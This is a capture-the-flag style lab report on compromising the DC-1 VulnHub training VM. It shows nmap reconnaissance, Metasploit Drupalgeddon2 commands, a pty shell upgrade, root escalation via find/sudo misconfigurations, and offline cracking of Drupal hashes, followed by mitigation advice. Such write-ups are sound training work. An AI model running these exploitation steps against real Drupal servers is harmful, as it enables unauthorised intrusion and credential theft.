## DC-1 VulnHub Lab 


# Lab Report: VulnHub DC-1 â€” Full Exploitation Chain

---

## ğŸ¯ Objective

Demonstrate a full exploitation chain on the DC-1 VulnHub VM.  
This lab shows how to gain a foothold, escalate privileges, access sensitive data, and document realistic mitigations.

---

## ğŸ› ï¸ Lab Environment

- **Target:** DC-1 VulnHub VM
- **Attacker:** Kali Linux
- **Network:** NAT
- **Tools:** Nmap, Hydra, Metasploit, Netcat, Hashcat, John the Ripper

---

## ğŸ”— Exploitation Chain Summary

| Stage | Description |
|-------|--------------|
| Recon | Identified open services, Drupal CMS |
| Foothold | Exploited Drupalgeddon2 vulnerability |
| Privilege Escalation | Escalated from `www-data` to `root` |
| Post-Exploitation | Retrieved `thefinalflag.txt` |
| Mitigation | Patching, upgrade, and lockout controls |

---

## ğŸ” Recon & Enumeration

**Nmap Full Port Scan**

```bash
nmap -sV -A <target-ip>
````
![nmap_scan](/screenshots/vulnhub/nmap_scan.png)

![netdiscovery](/screenshots/vulnhub/netdiscover.png)

![netdiscovery](/screenshots/vulnhub/netdiscovery_output.png)

**Result:**

* Port 80: Drupal site discovered
* Other open ports confirmed basic services

---

## âš¡ Initial Foothold

**Vulnerability:** Drupalgeddon2 (CVE-2018-7600)

**Steps:**

1. Launched `exploit/unix/webapp/drupal_drupalgeddon2` in Metasploit:

   ```bash
   use exploit/unix/webapp/drupal_drupalgeddon2
   set RHOSTS <target-ip>
   set TARGETURI /  
   run
   ```
![metasploit](/screenshots/vulnhub/msf_search_exploit.png)

![metasploit](/screenshots/vulnhub/msf_drupalgeddon2.png)

2. Gained a `meterpreter` session.

3. Spawned a proper bash shell:

   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```
![meterpreter](/screenshots/vulnhub/script_better_shell.png)

---

## ğŸš€ Privilege Escalation

**Escalation Path:**

* Enumerated vulnerable configurations.
* Used `find` and `sudo` misconfigs to escalate from `www-data` to `root`.

**Proof:**

```bash
id
# uid=0(root)
```
![meterpreter](/screenshots/vulnhub/shell_root.png)


**Retrieved Final Flag:**

```bash
cd /root
ls
cat thefinalflag.txt
```

---

## ğŸ“Œ Post-Exploitation

* Verified root shell access.
* Enumerated system files.
* Extracted Drupal database creds.
* Identified password hash `$S$...` and cracked offline.

![drupal](/screenshots/vulnhub/drupal_user_escalation.png)

![meterpreter](/screenshots/vulnhub/user_table.png)

![meterpreter](/screenshots/vulnhub/eric_user_admin.png)


![meterpreter](/screenshots/vulnhub/hashcat_crack.png)

![meterpreter](/screenshots/vulnhub/hash_crack.png)
---

## âš–ï¸ Risk & Business Impact

* **Risk:** Critical. Full system compromise including root access.
* **Impact:** Attackers could deface content, steal credentials, pivot to internal networks.
* **Likelihood:** High due to public exploit.

---

## ğŸ›¡ï¸ Mitigation & Remediation

âœ… **Recommended Actions:**

* Patch Drupal core to the latest stable version.
* Harden web server configurations.
* Enforce strong password policies.
* Limit login attempts, monitor logs.
* Use MFA for admin accounts.

---

## ğŸ“š Lessons Learned

* Using **Hydra** and **Hashcat** for brute force on **salted hashes** can be *very time-consuming* â€” better to combine with other vectors (e.g., database access).
* Aggressive brute forcing on login forms with lockouts causes delays â€” next time, check for lockout controls *before launching Hydra*.
* **Always note down** credentials, tables, and user hashes as you enumerate â€” saves time if you need to reset or pivot later.
* Consider using `drupal user-password` SQL queries to reset admin passwords *directly* instead of brute forcing.
* **Document everything** â€” clear evidence and commands help with report clarity.

---

## âœ… Final Outcome

**Root access confirmed, final flag captured.
Vulnerability chain: Recon â†’ Exploit â†’ Escalate â†’ Proof â†’ Mitigation.**

---

*End of Report*

